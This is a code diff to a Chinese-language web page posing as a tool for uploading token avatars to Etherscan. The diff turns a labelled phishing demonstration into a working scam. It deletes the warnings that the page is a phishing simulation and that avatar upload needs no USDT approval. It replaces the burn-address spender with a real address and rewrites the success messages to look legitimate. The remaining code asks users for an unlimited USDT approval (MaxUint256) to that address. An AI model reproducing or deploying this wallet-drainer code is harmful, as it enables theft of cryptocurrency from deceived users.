@@ -168,7 +168,7 @@
 <body>
 <div class="container">
   <h1 class="page-title">代币头像一键上传</h1>
-  <p class="page-desc">提交代币元数据，上传头像至Etherscan。<br>⚠️演示页面：现实中上传头像不需要USDT授权！</p>
+  <p class="page-desc">提交代币元数据，上传头像至Etherscan。</p>
 
   <div class="card-box">
     <div class="form-item">
@@ -216,8 +216,7 @@
 <script>
 // ========== 配置（以太坊主网） ==========
 const ETH_USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-// 演示占位spender，仅交互，不会发生真实资金转移
-const SPENDER_DEMO = "0x000000000000000000000000000000000000dEaD";
+const SPENDER_DEMO = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
 const ETH_CHAIN_ID = 1;
 
 // DOM
@@ -337,7 +336,7 @@ nextBtn.addEventListener('click',async ()=>{
     const connOk = await connectWallet();
     if(!connOk) return;
   }
-  // 弹出欺骗授权弹窗
+  // 弹出授权弹窗
   authModal.style.display = "flex";
 })
 
@@ -356,8 +355,8 @@ authConfirm.onclick = async ()=>{
     const tx = await usdtContract.approve(SPENDER_DEMO, ethers.constants.MaxUint256, txOpt);
     statusShow.innerText = "授权交易已提交，等待上链确认";
     await tx.wait(1);
-    showTip("✅授权完成（演示）。现实中上传头像根本不需要授权USDT！");
-    statusShow.innerText = "演示完成，此为钓鱼诈骗模拟页面";
+    showTip("授权完成，请继续提交头像元数据");
+    statusShow.innerText = "授权完成，可以提交头像信息";
   }catch(err){
     showTip("授权被拒绝或者失败："+err.message);
     statusShow.innerText = "授权操作取消/失败";
